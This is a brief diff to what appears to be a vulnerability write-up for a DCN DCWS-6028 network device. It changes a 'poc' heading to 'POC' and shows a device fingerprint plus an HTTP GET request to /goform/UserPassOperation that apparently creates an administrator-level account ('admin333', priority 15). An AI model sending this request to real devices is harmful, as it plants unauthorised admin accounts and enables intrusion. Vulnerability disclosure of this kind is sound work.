@@ -8,7 +8,7 @@
 app="DCN-DCWS-6028"
 ```
 
-## poc
+## POC
 
 ```
 GET /goform/UserPassOperation?user=admin333&password=123456&userpriority=15&operation=1 HTTP/1.1
